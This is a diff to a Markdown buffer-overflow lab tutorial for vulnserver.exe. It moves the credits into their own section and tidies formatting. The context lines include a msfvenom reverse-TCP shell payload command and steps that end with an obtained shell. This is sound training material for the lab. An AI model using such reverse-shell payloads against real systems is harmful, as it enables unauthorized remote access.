@@ -13,9 +13,10 @@ tags:
 
 # Buffer Overflow Tutorial 
 > Basic EIP Bypass (vulnserver.exe)(Windows version)    
-> Credits to Stephen Bradshaw: https://github.com/stephenbradshaw/vulnserver
+
 
 ### Description
+
 Buffer overflow is probably the best known form of software security vulnerability. Most software developers know what a buffer overflow vulnerability is, but buffer overflow attacks against both legacy and newly-developed applications are still quite common. Part of the problem is due to the wide variety of ways buffer overflows can occur, and part is due to the error-prone techniques often used to prevent them.
 Buffer overflows are not easy to discover and even when one is discovered, it is generally extremely difficult to exploit. Nevertheless, attackers have managed to identify buffer overflows in a staggering array of products and components.
 In a classic buffer overflow exploit, the attacker sends data to a program, which it stores in an undersized stack buffer. The result is that information on the call stack is overwritten, including the function’s return pointer. The data sets the value of the return pointer so that when the function returns, it transfers control to malicious code contained in the attacker’s data.
@@ -42,7 +43,7 @@ Buffer overflow vulnerabilities typically occur in code that:
 * [Finding bad charaters](#finding-bad-charaters)
 * [Finding the right module](#finding-the-right-module)
 * [Generating the shellcode](#generating-the-shellcode)
-
+* [Credits](#credits)
 
 
 ## Setup
@@ -398,6 +399,7 @@ The last step in this process, generating Shellcode and ensuring that we can exp
 msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 EXITFUNC=thread -f c -a x86 -b "\x00"
 ```
 ![](/assets/images/exploit.png)
+
 *Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"*
 
 4. Edit the included script.
@@ -477,3 +479,8 @@ python bofpoc.py
 
 9. You should now have a shell, congratulations.
 ![](/assets/images/win.png)
+
+
+## Credits
+> Stephen Bradshaw: https://github.com/stephenbradshaw/vulnserver
+> TheCyberMentor: https://www.thecybermentor.com/buffer-overflows-made-easy
